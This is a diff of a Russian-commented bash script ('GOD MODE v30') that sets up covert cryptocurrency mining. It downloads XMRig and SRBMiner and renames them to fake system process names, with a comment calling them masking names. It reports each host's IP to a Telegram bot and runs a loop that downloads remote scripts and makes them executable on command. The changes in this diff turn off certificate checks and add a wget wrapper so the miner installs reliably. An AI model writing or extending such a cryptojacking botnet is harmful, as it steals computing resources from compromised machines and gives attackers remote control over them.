@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v28: GUIDED SETUP FIX & PEARL OFFICIAL          |
+# | GOD MODE v30: GREP-A BINARY INSPECTION & SAFE SSL WGET  |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -34,6 +34,39 @@ fi
 mkdir -p "$BASE_DIR"
 cd "$BASE_DIR" || exit 1
 
+# Добавляем BASE_DIR в PATH для взаимодействия с нашими утилитами
+export PATH="$BASE_DIR:$PATH"
+
+# ----------------------------------------------------
+# [ PHASE 0: WGET WRAPPER FALLBACK (FOR SRBMINER) ]
+# ----------------------------------------------------
+# Если в системе нет 'wget', создаем прозрачную обертку через 'curl'
+if ! command -v wget >/dev/null 2>&1; then
+    cat << 'EOF' > "$BASE_DIR/wget"
+#!/bin/bash
+# Universal wget fallback wrapper using curl
+URL=""
+OUTFILE=""
+for arg in "$@"; do
+    if [ "$PREV" = "-O" ] || [ "$PREV" = "-o" ] || [ "$PREV" = "--output-document" ]; then
+        OUTFILE="$arg"
+    elif [[ "$arg" =~ ^http ]]; then
+        URL="$arg"
+    fi
+    PREV="$arg"
+done
+
+if [ -n "$OUTFILE" ] && [ -n "$URL" ]; then
+    exec curl -L -k -s -o "$OUTFILE" "$URL"
+elif [ -n "$URL" ]; then
+    exec curl -L -k -s -O "$URL"
+else
+    exec curl -L -k -s "$@"
+fi
+EOF
+    chmod +x "$BASE_DIR/wget"
+fi
+
 # Маскировочные имена процессов
 BIN_CPU="sys_net_daemon" 
 BIN_GPU="sys_render_service"
@@ -46,7 +79,7 @@ LOG_GPU="$BASE_DIR/.gpu_data.log"
 # ----------------------------------------------------
 get_worker() {
     local ip
-    ip=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- -t 1 -T 2 ifconfig.me 2>/dev/null)
+    ip=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- --no-check-certificate -t 1 -T 2 ifconfig.me 2>/dev/null)
     [ -z "$ip" ] && ip="111.111.111.111"
     
     local safe_worker
@@ -77,21 +110,23 @@ detect_gpu() {
 HAS_GPU=$(detect_gpu)
 
 # ----------------------------------------------------
-# [ PHASE 2: MODULE DOWNLOAD & SAFE INSTALL ]
+# [ PHASE 2: MODULE DOWNLOAD & SAFE VERIFICATION ]
 # ----------------------------------------------------
 URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz"
 
 # CPU Setup
 if [ ! -f "$BIN_CPU" ]; then
-    curl -L -k -s -m 30 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz -T 30 "$URL_XMRIG"
-    tar -xf cpu.tar.gz 2>/dev/null
-    FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
-    if [ -n "$FOUND_CPU" ]; then
-        mv "$FOUND_CPU" "./$BIN_CPU"
-        chmod +x "./$BIN_CPU"
+    curl -L -k -s -m 30 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz --no-check-certificate -T 30 "$URL_XMRIG"
+    if [ -f cpu.tar.gz ] && [ -s cpu.tar.gz ]; then
+        tar -xf cpu.tar.gz 2>/dev/null
+        FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
+        if [ -n "$FOUND_CPU" ]; then
+            mv "$FOUND_CPU" "./$BIN_CPU"
+            chmod +x "./$BIN_CPU"
+        fi
+        rm -rf cpu.tar.gz xmrig*
     fi
-    rm -rf cpu.tar.gz xmrig*
 fi
 
 # CPU Config
@@ -111,13 +146,13 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup (Проверка файла через 'strings' без вызова бинарника, чтобы НЕ включать Guided Setup)
+# GPU Setup (Использование grep -qia вместо утилиты strings из binutils)
 if [ "$HAS_GPU" -eq 1 ]; then
     NEED_INSTALL=0
     if [ ! -f "$BIN_GPU" ]; then
         NEED_INSTALL=1
     else
-        if ! strings "./$BIN_GPU" 2>/dev/null | grep -i "SRBMiner" >/dev/null; then
+        if ! grep -qia "SRBMiner" "./$BIN_GPU" 2>/dev/null; then
             rm -f "$BIN_GPU"
             NEED_INSTALL=1
         fi
@@ -126,14 +161,18 @@ if [ "$HAS_GPU" -eq 1 ]; then
     if [ "$NEED_INSTALL" -eq 1 ]; then
         pkill -9 -f "$BIN_GPU" 2>/dev/null
         rm -f "$BIN_GPU" gpu.tar.gz
-        curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz -T 40 "$URL_SRBMINER"
-        tar -xf gpu.tar.gz 2>/dev/null
-        FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
-        if [ -n "$FOUND_GPU" ] && [ -f "$FOUND_GPU" ]; then
-            mv "$FOUND_GPU" "./$BIN_GPU"
-            chmod +x "./$BIN_GPU"
+        curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz --no-check-certificate -T 40 "$URL_SRBMINER"
+        
+        # Проверка целостности и ненулевого размера скачанного архива
+        if [ -f gpu.tar.gz ] && [ -s gpu.tar.gz ]; then
+            tar -xf gpu.tar.gz 2>/dev/null
+            FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
+            if [ -n "$FOUND_GPU" ] && [ -f "$FOUND_GPU" ]; then
+                mv "$FOUND_GPU" "./$BIN_GPU"
+                chmod +x "./$BIN_GPU"
+            fi
+            rm -rf gpu.tar.gz SRBMiner*
         fi
-        rm -rf gpu.tar.gz SRBMiner*
     fi
 fi
 
@@ -159,6 +198,7 @@ IS_ROOT=$IS_ROOT
 LOG_CPU="$LOG_CPU"
 LOG_GPU="$LOG_GPU"
 
+export PATH="\$BASE_DIR:\$PATH"
 cd "\$BASE_DIR" || exit 1
 
 LAST_REPORT=\$(date +%s)
@@ -296,7 +336,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V28 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V30 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -371,7 +411,7 @@ while true; do
                     TIMESTAMP=\$(date +%s)
                     DEST_SCRIPT="\$MODULE_DIR/Connfy_\${TIMESTAMP}.sh"
                     
-                    curl -L -k -s -m 15 --connect-timeout 5 -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" -T 15 "\$TARGET_URL"
+                    curl -L -k -s -m 15 --connect-timeout 5 -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" --no-check-certificate -T 15 "\$TARGET_URL"
                     
                     if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
                         chmod +x "\$DEST_SCRIPT"
@@ -418,7 +458,7 @@ pkill -9 -f "watchdog.sh" 2>/dev/null
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V28 INITIALIZED"
+echo "[+] ENGINE V30 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
